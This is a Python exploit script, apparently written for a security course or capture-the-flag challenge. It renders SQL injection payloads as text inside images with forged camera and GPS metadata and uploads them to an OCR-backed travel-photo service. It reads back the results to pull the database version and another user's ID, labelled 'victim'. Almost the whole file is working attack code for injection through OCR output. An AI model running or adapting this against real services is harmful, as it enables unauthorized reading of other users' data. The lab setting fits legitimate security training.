# v2_bigimg.py — KEY FINDING: OCR reads 'SELECT user_id FROM images WHERE id=1' PERFECTLY as plain
# text. Failure appears only with the wrapper 9'||(...)||'9 on LONG payloads -> the longer text
# gets rendered smaller/wraps and the wrapper quotes/|| deform. FIX: scale font & canvas UP with
# text length so long queries stay crisp & single-line. Also: print which image is tested, and
# VALIDATE each upload is 200 (report classifier rejections explicitly).
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open("paisaje.png").convert("RGB")
CNT=[0]

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, fname, size=40):
    # BIG crisp single line: font stays large, width grows with text so it never shrinks/wraps.
    f=font(size)
    tmp=Image.new("RGB",(10,10)); td=ImageDraw.Draw(tmp)
    tw=td.textbbox((0,0),text,font=f)[2]
    W=tw+140; H=max(700, int(base_img.height * (W/base_img.width)))  # keep landscape proportion tall
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img)
    d.rectangle([0,0,W,size+50],fill=(255,255,255))
    d.text((30,20),text,font=f,fill=(0,0,0))
    img.save(fname,"jpeg",quality=80,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),fname)
    return "data:image/jpeg;base64,"+base64.b64encode(open(fname,"rb").read()).decode()

def up(painted, desc):
    CNT[0]+=1
    fname=f"img_{desc}.jpg"
    print(f"[testing {fname}] painted={painted!r}")
    uri=build(painted, fname)
    r=requests.post(f"{BASE}/upload", json={"image":uri,"description":desc,"user_id":UID})
    body=r.text[:80].strip()
    ocr=""
    valid = (r.status_code==200)
    if not valid:
        # distinguish classifier rejection vs SQL error
        if "viaje" in body:
            print(f"   -> {r.status_code} CLASSIFIER REJECTED (image invalid): {body}")
        else:
            print(f"   -> {r.status_code} (SQL error / broke) {body}")
    else:
        data=requests.get(f"{BASE}/images/{UID}").json()
        row=next((x for x in data if x.get("description")==desc),None)
        ocr=row.get("summary_ocr","") if row else ""
        print(f"   -> 200 OK  ocr={ocr!r}")
    inner=ocr
    if inner.startswith("9"): inner=inner[1:]
    if inner.endswith("9"): inner=inner[:-1]
    return r.status_code, inner

sq="'"
print("### STEP 1: confirm base still works with BIG image ###")
up("9"+sq+"||(SELECT sqlite_version())||"+sq+"9", "base")

print("\n### STEP 2: the full query, now on a BIG crisp image ###")
up("9"+sq+"||(SELECT user_id FROM images WHERE id=1)||"+sq+"9", "uid1")
up("9"+sq+"||(SELECT user_id FROM images WHERE user_id<>"+sq+UID+sq+" LIMIT 1)||"+sq+"9", "victim")
